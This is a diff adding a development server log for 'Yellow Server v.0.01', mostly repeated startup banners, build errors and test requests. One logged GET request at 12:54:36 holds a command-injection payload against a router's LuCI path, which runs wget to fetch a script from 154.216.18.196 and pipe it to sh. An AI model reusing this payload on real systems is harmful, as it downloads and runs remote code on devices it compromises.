@@ -1,0 +1,381 @@
+2024-08-20 10:26:33 [INFO] 
+2024-08-20 10:26:33 [INFO] ====================
+2024-08-20 10:26:33 [INFO] Yellow Server v.0.01
+2024-08-20 10:26:33 [INFO] ====================
+2024-08-20 10:26:33 [INFO] 
+2024-08-20 10:26:34 [INFO] HTTP server is running on port: 80
+2024-08-20 10:26:34 [INFO] HTTPS server is running on port: 443
+8/20/2024, 12:30:12 PM [INFO] 
+8/20/2024, 12:30:12 PM [INFO] ====================
+8/20/2024, 12:30:12 PM [INFO] Yellow Server v.0.01
+8/20/2024, 12:30:12 PM [INFO] ====================
+8/20/2024, 12:30:12 PM [INFO] 
+8/20/2024, 12:30:12 PM [INFO] HTTP server is running on port: 80
+8/20/2024, 12:30:12 PM [INFO] HTTPS server is running on port: 443
+8/20/2024, 12:30:31 PM [INFO] 
+8/20/2024, 12:30:31 PM [INFO] ====================
+8/20/2024, 12:30:31 PM [INFO] Yellow Server v.0.01
+8/20/2024, 12:30:31 PM [INFO] ====================
+8/20/2024, 12:30:31 PM [INFO] 
+8/20/2024, 12:30:31 PM [INFO] HTTP server is running on port: 80
+8/20/2024, 12:30:31 PM [INFO] HTTPS server is running on port: 443
+2024-08-20 12:31:49 [INFO] 
+2024-08-20 12:31:49 [INFO] ====================
+2024-08-20 12:31:49 [INFO] Yellow Server v.0.01
+2024-08-20 12:31:49 [INFO] ====================
+2024-08-20 12:31:49 [INFO] 
+2024-08-20 12:31:49 [INFO] HTTP server is running on port: 80
+2024-08-20 12:31:49 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:32:34 [INFO] 
+2024-08-20 12:32:34 [INFO] ====================
+2024-08-20 12:32:34 [INFO] Yellow Server v.0.01
+2024-08-20 12:32:34 [INFO] ====================
+2024-08-20 12:32:34 [INFO] 
+2024-08-20 12:32:35 [INFO] HTTP server is running on port: 80
+2024-08-20 12:32:35 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:35:25 [INFO] 
+2024-08-20 12:35:25 [INFO] ====================
+2024-08-20 12:35:25 [INFO] Yellow Server v.0.01
+2024-08-20 12:35:25 [INFO] ====================
+2024-08-20 12:35:25 [INFO] 
+2024-08-20 12:35:25 [INFO] HTTP server is running on port: 80
+2024-08-20 12:35:25 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:35:46 [INFO] GET request from: null (null), URL: /aaa/bbb?kkk=jjj&fff=ddd
+2024-08-20 12:35:46 [INFO] GET request from: null (null), URL: /favicon.ico
+2024-08-20 12:41:13 [INFO] 
+2024-08-20 12:41:13 [INFO] ====================
+2024-08-20 12:41:13 [INFO] Yellow Server v.0.01
+2024-08-20 12:41:13 [INFO] ====================
+2024-08-20 12:41:13 [INFO] 
+2024-08-20 12:41:13 [INFO] HTTP server is running on port: 80
+2024-08-20 12:41:13 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:41:19 [INFO] GET request from: null (null), URL: /aaa/bbb?kkk=jjj&fff=ddd
+2024-08-20 12:41:19 [INFO] GET request from: null (null), URL: /favicon.ico
+2024-08-20 12:46:39 [INFO] 
+2024-08-20 12:46:40 [INFO] ====================
+2024-08-20 12:46:40 [INFO] Yellow Server v.0.01
+2024-08-20 12:46:40 [INFO] ====================
+2024-08-20 12:46:40 [INFO] 
+2024-08-20 12:46:40 [INFO] HTTP server is running on port: 80
+2024-08-20 12:46:40 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:46:52 [INFO] 
+2024-08-20 12:46:52 [INFO] ====================
+2024-08-20 12:46:52 [INFO] Yellow Server v.0.01
+2024-08-20 12:46:52 [INFO] ====================
+2024-08-20 12:46:52 [INFO] 
+2024-08-20 12:46:52 [INFO] HTTP server is running on port: 80
+2024-08-20 12:46:52 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:46:53 [INFO] GET request from: unknown, URL: /aaa/bbb?kkk=jjj&fff=ddd
+2024-08-20 12:46:53 [INFO] GET request from: unknown, URL: /favicon.ico
+2024-08-20 12:48:07 [INFO] 
+2024-08-20 12:48:07 [INFO] ====================
+2024-08-20 12:48:07 [INFO] Yellow Server v.0.01
+2024-08-20 12:48:07 [INFO] ====================
+2024-08-20 12:48:07 [INFO] 
+2024-08-20 12:48:07 [INFO] HTTP server is running on port: 80
+2024-08-20 12:48:07 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:48:10 [INFO] GET request from: unknown, URL: /aaa/bbb?kkk=jjj&fff=ddd
+2024-08-20 12:48:10 [INFO] GET request from: unknown, URL: /favicon.ico
+2024-08-20 12:51:53 [INFO] 
+2024-08-20 12:51:53 [INFO] ====================
+2024-08-20 12:51:53 [INFO] Yellow Server v.0.01
+2024-08-20 12:51:53 [INFO] ====================
+2024-08-20 12:51:53 [INFO] 
+2024-08-20 12:51:53 [INFO] BuildMessage: Cannot use import statement with CommonJS-only features
+2024-08-20 12:52:28 [INFO] 
+2024-08-20 12:52:28 [INFO] ====================
+2024-08-20 12:52:28 [INFO] Yellow Server v.0.01
+2024-08-20 12:52:28 [INFO] ====================
+2024-08-20 12:52:28 [INFO] 
+2024-08-20 12:52:28 [INFO] ResolveMessage: Cannot find package "elysia-ip" from "/root/yellow-server/src/libs/webserver.js"
+2024-08-20 12:52:39 [INFO] 
+2024-08-20 12:52:39 [INFO] ====================
+2024-08-20 12:52:39 [INFO] Yellow Server v.0.01
+2024-08-20 12:52:39 [INFO] ====================
+2024-08-20 12:52:39 [INFO] 
+2024-08-20 12:52:39 [INFO] HTTP server is running on port: 80
+2024-08-20 12:52:39 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:52:50 [INFO] GET request from: unknown, URL: /aaa/bbb?kkk=jjj&fff=ddd
+2024-08-20 12:52:51 [INFO] GET request from: unknown, URL: /favicon.ico
+2024-08-20 12:54:36 [INFO] GET request from: unknown, URL: /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.18.196%3A88%2Ft%7Csh%3B%60)
+2024-08-20 12:54:39 [INFO] 
+2024-08-20 12:54:39 [INFO] ====================
+2024-08-20 12:54:39 [INFO] Yellow Server v.0.01
+2024-08-20 12:54:39 [INFO] ====================
+2024-08-20 12:54:39 [INFO] 
+2024-08-20 12:54:39 [INFO] HTTP server is running on port: 80
+2024-08-20 12:54:39 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:54:41 [INFO] GET request from: unknown, URL: /aaa/bbb?kkk=jjj&fff=ddd
+2024-08-20 12:54:41 [INFO] GET request from: unknown, URL: /favicon.ico
+2024-08-20 12:55:23 [INFO] 
+2024-08-20 12:55:23 [INFO] ====================
+2024-08-20 12:55:23 [INFO] Yellow Server v.0.01
+2024-08-20 12:55:23 [INFO] ====================
+2024-08-20 12:55:23 [INFO] 
+2024-08-20 12:55:24 [INFO] HTTP server is running on port: 80
+2024-08-20 12:55:24 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:55:49 [INFO] 
+2024-08-20 12:55:49 [INFO] ====================
+2024-08-20 12:55:49 [INFO] Yellow Server v.0.01
+2024-08-20 12:55:49 [INFO] ====================
+2024-08-20 12:55:49 [INFO] 
+2024-08-20 12:55:49 [INFO] HTTP server is running on port: 80
+2024-08-20 12:55:49 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:55:56 [INFO] 
+2024-08-20 12:55:56 [INFO] ====================
+2024-08-20 12:55:56 [INFO] Yellow Server v.0.01
+2024-08-20 12:55:56 [INFO] ====================
+2024-08-20 12:55:56 [INFO] 
+2024-08-20 12:55:56 [INFO] HTTP server is running on port: 80
+2024-08-20 12:55:56 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:56:10 [INFO] 
+2024-08-20 12:56:10 [INFO] ====================
+2024-08-20 12:56:10 [INFO] Yellow Server v.0.01
+2024-08-20 12:56:10 [INFO] ====================
+2024-08-20 12:56:10 [INFO] 
+2024-08-20 12:56:10 [INFO] HTTP server is running on port: 80
+2024-08-20 12:56:10 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:58:36 [INFO] 
+2024-08-20 12:58:36 [INFO] ====================
+2024-08-20 12:58:36 [INFO] Yellow Server v.0.01
+2024-08-20 12:58:36 [INFO] ====================
+2024-08-20 12:58:36 [INFO] 
+2024-08-20 12:58:37 [INFO] HTTP server is running on port: 80
+2024-08-20 12:58:37 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:58:42 [INFO] 
+2024-08-20 12:58:42 [INFO] ====================
+2024-08-20 12:58:42 [INFO] Yellow Server v.0.01
+2024-08-20 12:58:42 [INFO] ====================
+2024-08-20 12:58:42 [INFO] 
+2024-08-20 12:58:42 [INFO] HTTP server is running on port: 80
+2024-08-20 12:58:42 [INFO] HTTPS server is running on port: 443
+2024-08-20 12:59:07 [INFO] 
+2024-08-20 12:59:07 [INFO] ====================
+2024-08-20 12:59:07 [INFO] Yellow Server v.0.01
+2024-08-20 12:59:07 [INFO] ====================
+2024-08-20 12:59:07 [INFO] 
+2024-08-20 12:59:07 [INFO] HTTP server is running on port: 80
+2024-08-20 12:59:07 [ERROR] Cannot start web server.
+2024-08-20 12:59:07 [ERROR] TypeError: Expected fetch() to be a function
+2024-08-20 12:59:11 [INFO] 
+2024-08-20 12:59:12 [INFO] ====================
+2024-08-20 12:59:12 [INFO] Yellow Server v.0.01
+2024-08-20 12:59:12 [INFO] ====================
+2024-08-20 12:59:12 [INFO] 
+2024-08-20 12:59:12 [INFO] HTTP server is running on port: 80
+2024-08-20 12:59:12 [INFO] HTTPS server is running on port: 443
+2024-08-20 13:00:58 [INFO] 
+2024-08-20 13:00:58 [INFO] ====================
+2024-08-20 13:00:58 [INFO] Yellow Server v.0.01
+2024-08-20 13:00:58 [INFO] ====================
+2024-08-20 13:00:58 [INFO] 
+2024-08-20 13:00:58 [INFO] HTTP server is running on port: 80
+2024-08-20 13:00:58 [INFO] HTTPS server is running on port: 443
+2024-08-20 13:01:10 [INFO] 
+2024-08-20 13:01:10 [INFO] ====================
+2024-08-20 13:01:10 [INFO] Yellow Server v.0.01
+2024-08-20 13:01:10 [INFO] ====================
+2024-08-20 13:01:10 [INFO] 
+2024-08-20 13:01:10 [INFO] HTTP server is running on port: 80
+2024-08-20 13:01:10 [INFO] HTTPS server is running on port: 443
+2024-08-20 13:02:27 [INFO] 
+2024-08-20 13:02:27 [INFO] ====================
+2024-08-20 13:02:27 [INFO] Yellow Server v.0.01
+2024-08-20 13:02:27 [INFO] ====================
+2024-08-20 13:02:27 [INFO] 
+2024-08-20 13:02:28 [INFO] HTTP server is running on port: 80
+2024-08-20 13:02:28 [INFO] HTTPS server is running on port: 443
+2024-08-20 13:02:53 [INFO] 
+2024-08-20 13:02:53 [INFO] ====================
+2024-08-20 13:02:53 [INFO] Yellow Server v.0.01
+2024-08-20 13:02:53 [INFO] ====================
+2024-08-20 13:02:53 [INFO] 
+2024-08-20 13:02:54 [INFO] HTTP server is running on port: 80
+2024-08-20 13:02:54 [INFO] HTTPS server is running on port: 443
+2024-08-20 13:05:38 [INFO] 
+2024-08-20 13:05:38 [INFO] ====================
+2024-08-20 13:05:38 [INFO] Yellow Server v.0.01
+2024-08-20 13:05:38 [INFO] ====================
+2024-08-20 13:05:38 [INFO] 
+2024-08-20 13:05:38 [INFO] HTTP server is running on port: 80
+2024-08-20 13:05:38 [INFO] HTTPS server is running on port: 443
+2024-08-20 13:08:34 [INFO] 
+2024-08-20 13:08:34 [INFO] ====================
+2024-08-20 13:08:34 [INFO] Yellow Server v.0.01
+2024-08-20 13:08:34 [INFO] ====================
+2024-08-20 13:08:34 [INFO] 
+2024-08-20 13:08:34 [INFO] HTTP server is running on port: 80
+2024-08-20 13:08:34 [INFO] HTTPS server is running on port: 443
+2024-08-20 13:08:54 [INFO] 
+2024-08-20 13:08:54 [INFO] ====================
+2024-08-20 13:08:54 [INFO] Yellow Server v.0.01
+2024-08-20 13:08:54 [INFO] ====================
+2024-08-20 13:08:54 [INFO] 
+2024-08-20 13:08:54 [INFO] HTTP server is running on port: 80
+2024-08-20 13:08:54 [INFO] HTTPS server is running on port: 443
+2024-08-20 13:09:20 [INFO] 
+2024-08-20 13:09:20 [INFO] ====================
+2024-08-20 13:09:20 [INFO] Yellow Server v.0.01
+2024-08-20 13:09:20 [INFO] ====================
+2024-08-20 13:09:20 [INFO] 
+2024-08-20 13:09:20 [INFO] HTTP server is running on port: 80
+2024-08-20 13:09:20 [INFO] HTTPS server is running on port: 443
+2024-08-20 13:09:27 [INFO] 
+2024-08-20 13:09:27 [INFO] ====================
+2024-08-20 13:09:27 [INFO] Yellow Server v.0.01
+2024-08-20 13:09:27 [INFO] ====================
+2024-08-20 13:09:27 [INFO] 
+2024-08-20 13:09:27 [INFO] HTTP server is running on port: 80
+2024-08-20 13:09:27 [INFO] HTTPS server is running on port: 443
+2024-08-20 13:12:18 [INFO] 
+2024-08-20 13:12:18 [INFO] ====================
+2024-08-20 13:12:18 [INFO] Yellow Server v.0.01
+2024-08-20 13:12:18 [INFO] ====================
+2024-08-20 13:12:18 [INFO] 
+2024-08-20 13:12:18 [INFO] HTTP server is running on port: 80
+2024-08-20 13:12:18 [INFO] HTTPS server is running on port: 443
+2024-08-20 13:13:19 [INFO] 
+2024-08-20 13:13:19 [INFO] ====================
+2024-08-20 13:13:19 [INFO] Yellow Server v.0.01
+2024-08-20 13:13:19 [INFO] ====================
+2024-08-20 13:13:19 [INFO] 
+2024-08-20 13:13:19 [INFO] HTTP server is running on port: 80
+2024-08-20 13:13:19 [INFO] HTTPS server is running on port: 443
+2024-08-20 14:14:19 [INFO] 
+2024-08-20 14:14:20 [INFO] ====================
+2024-08-20 14:14:20 [INFO] Yellow Server v.0.01
+2024-08-20 14:14:20 [INFO] ====================
+2024-08-20 14:14:20 [INFO] 
+2024-08-20 14:14:20 [INFO] HTTP server is running on port: 80
+2024-08-20 14:14:20 [INFO] HTTPS server is running on port: 443
+2024-08-20 14:18:08 [INFO] 
+2024-08-20 14:18:08 [INFO] ====================
+2024-08-20 14:18:08 [INFO] Yellow Server v.0.01
+2024-08-20 14:18:08 [INFO] ====================
+2024-08-20 14:18:08 [INFO] 
+2024-08-20 14:18:08 [INFO] AggregateError: 2 errors building "/root/yellow-server/src/libs/webserver.js"
+2024-08-20 14:18:44 [INFO] 
+2024-08-20 14:18:44 [INFO] ====================
+2024-08-20 14:18:44 [INFO] Yellow Server v.0.01
+2024-08-20 14:18:44 [INFO] ====================
+2024-08-20 14:18:44 [INFO] 
+2024-08-20 14:18:44 [INFO] AggregateError: 10 errors building "/root/yellow-server/src/libs/webserver.js"
+2024-08-20 14:18:58 [INFO] 
+2024-08-20 14:18:58 [INFO] ====================
+2024-08-20 14:18:58 [INFO] Yellow Server v.0.01
+2024-08-20 14:18:58 [INFO] ====================
+2024-08-20 14:18:58 [INFO] 
+2024-08-20 14:18:58 [INFO] AggregateError: 10 errors building "/root/yellow-server/src/libs/webserver.js"
+2024-08-20 14:19:18 [INFO] 
+2024-08-20 14:19:18 [INFO] ====================
+2024-08-20 14:19:18 [INFO] Yellow Server v.0.01
+2024-08-20 14:19:18 [INFO] ====================
+2024-08-20 14:19:18 [INFO] 
+2024-08-20 14:19:18 [INFO] AggregateError: 10 errors building "/root/yellow-server/src/libs/webserver.js"
+2024-08-20 14:19:43 [INFO] 
+2024-08-20 14:19:43 [INFO] ====================
+2024-08-20 14:19:43 [INFO] Yellow Server v.0.01
+2024-08-20 14:19:43 [INFO] ====================
+2024-08-20 14:19:43 [INFO] 
+2024-08-20 14:19:43 [INFO] AggregateError: 10 errors building "/root/yellow-server/src/libs/webserver.js"
+2024-08-20 14:20:52 [INFO] 
+2024-08-20 14:20:52 [INFO] ====================
+2024-08-20 14:20:52 [INFO] Yellow Server v.0.01
+2024-08-20 14:20:52 [INFO] ====================
+2024-08-20 14:20:52 [INFO] 
+2024-08-20 14:20:52 [INFO] AggregateError: 10 errors building "/root/yellow-server/src/libs/webserver.js"
+2024-08-20 14:21:00 [INFO] 
+2024-08-20 14:21:00 [INFO] ====================
+2024-08-20 14:21:00 [INFO] Yellow Server v.0.01
+2024-08-20 14:21:00 [INFO] ====================
+2024-08-20 14:21:00 [INFO] 
+2024-08-20 14:21:00 [INFO] AggregateError: 10 errors building "/root/yellow-server/src/libs/webserver.js"
+2024-08-20 14:22:14 [INFO] 
+2024-08-20 14:22:14 [INFO] ====================
+2024-08-20 14:22:14 [INFO] Yellow Server v.0.01
+2024-08-20 14:22:14 [INFO] ====================
+2024-08-20 14:22:14 [INFO] 
+2024-08-20 14:22:14 [INFO] AggregateError: 10 errors building "/root/yellow-server/src/libs/webserver.js"
+2024-08-20 14:24:09 [INFO] 
+2024-08-20 14:24:09 [INFO] ====================
+2024-08-20 14:24:09 [INFO] Yellow Server v.0.01
+2024-08-20 14:24:09 [INFO] ====================
+2024-08-20 14:24:09 [INFO] 
+2024-08-20 14:24:09 [ERROR] Cannot start web server.
+2024-08-20 14:24:09 [ERROR] ReferenceError: Can't find variable: req
+2024-08-20 14:24:43 [INFO] 
+2024-08-20 14:24:43 [INFO] ====================
+2024-08-20 14:24:43 [INFO] Yellow Server v.0.01
+2024-08-20 14:24:43 [INFO] ====================
+2024-08-20 14:24:43 [INFO] 
+2024-08-20 14:24:43 [INFO] AggregateError: 3 errors building "/root/yellow-server/src/libs/webserver.js"
+2024-08-20 14:24:49 [INFO] 
+2024-08-20 14:24:49 [INFO] ====================
+2024-08-20 14:24:49 [INFO] Yellow Server v.0.01
+2024-08-20 14:24:49 [INFO] ====================
+2024-08-20 14:24:49 [INFO] 
+2024-08-20 14:24:49 [ERROR] Cannot start web server.
+2024-08-20 14:24:49 [ERROR] ReferenceError: Can't find variable: req
+2024-08-20 14:24:55 [INFO] 
+2024-08-20 14:24:55 [INFO] ====================
+2024-08-20 14:24:55 [INFO] Yellow Server v.0.01
+2024-08-20 14:24:55 [INFO] ====================
+2024-08-20 14:24:55 [INFO] 
+2024-08-20 14:24:55 [ERROR] Cannot start web server.
+2024-08-20 14:24:55 [ERROR] ReferenceError: Can't find variable: req
+2024-08-20 14:26:01 [INFO] 
+2024-08-20 14:26:01 [INFO] ====================
+2024-08-20 14:26:01 [INFO] Yellow Server v.0.01
+2024-08-20 14:26:01 [INFO] ====================
+2024-08-20 14:26:01 [INFO] 
+2024-08-20 14:26:01 [ERROR] Cannot start web server.
+2024-08-20 14:26:01 [ERROR] ReferenceError: Can't find variable: req
+2024-08-20 14:27:21 [INFO] 
+2024-08-20 14:27:21 [INFO] ====================
+2024-08-20 14:27:21 [INFO] Yellow Server v.0.01
+2024-08-20 14:27:21 [INFO] ====================
+2024-08-20 14:27:21 [INFO] 
+2024-08-20 14:27:22 [ERROR] Cannot start web server.
+2024-08-20 14:27:22 [ERROR] ReferenceError: Can't find variable: req
+2024-08-20 14:28:39 [INFO] 
+2024-08-20 14:28:39 [INFO] ====================
+2024-08-20 14:28:39 [INFO] Yellow Server v.0.01
+2024-08-20 14:28:39 [INFO] ====================
+2024-08-20 14:28:39 [INFO] 
+2024-08-20 14:28:39 [INFO] HTTP server is running on port: 80
+2024-08-20 14:28:39 [INFO] HTTPS server is running on port: 443
+2024-08-20 14:29:30 [INFO] 
+2024-08-20 14:29:30 [INFO] ====================
+2024-08-20 14:29:30 [INFO] Yellow Server v.0.01
+2024-08-20 14:29:30 [INFO] ====================
+2024-08-20 14:29:30 [INFO] 
+2024-08-20 14:29:30 [INFO] HTTP server is running on port: 80
+2024-08-20 14:29:30 [INFO] HTTPS server is running on port: 443
+2024-08-20 14:31:50 [INFO] 
+2024-08-20 14:31:50 [INFO] ====================
+2024-08-20 14:31:50 [INFO] Yellow Server v.0.01
+2024-08-20 14:31:50 [INFO] ====================
+2024-08-20 14:31:50 [INFO] 
+2024-08-20 14:31:50 [INFO] HTTP server is running on port: 80
+2024-08-20 14:31:50 [INFO] HTTPS server is running on port: 443
+2024-08-20 14:32:17 [INFO] 
+2024-08-20 14:32:17 [INFO] ====================
+2024-08-20 14:32:17 [INFO] Yellow Server v.0.01
+2024-08-20 14:32:17 [INFO] ====================
+2024-08-20 14:32:17 [INFO] 
+2024-08-20 14:32:17 [INFO] HTTP server is running on port: 80
+2024-08-20 14:32:17 [INFO] HTTPS server is running on port: 443
+2024-08-20 14:32:45 [INFO] 
+2024-08-20 14:32:45 [INFO] ====================
+2024-08-20 14:32:45 [INFO] Yellow Server v.0.01
+2024-08-20 14:32:45 [INFO] ====================
+2024-08-20 14:32:45 [INFO] 
+2024-08-20 14:32:45 [INFO] HTTP server is running on port: 80
+2024-08-20 14:32:45 [INFO] HTTPS server is running on port: 443
+2024-08-20 14:32:58 [INFO] 
+2024-08-20 14:32:58 [INFO] ====================
+2024-08-20 14:32:58 [INFO] Yellow Server v.0.01
+2024-08-20 14:32:58 [INFO] ====================
+2024-08-20 14:32:58 [INFO] 
+2024-08-20 14:32:58 [INFO] HTTP server is running on port: 80
+2024-08-20 14:32:58 [INFO] HTTPS server is running on port: 443
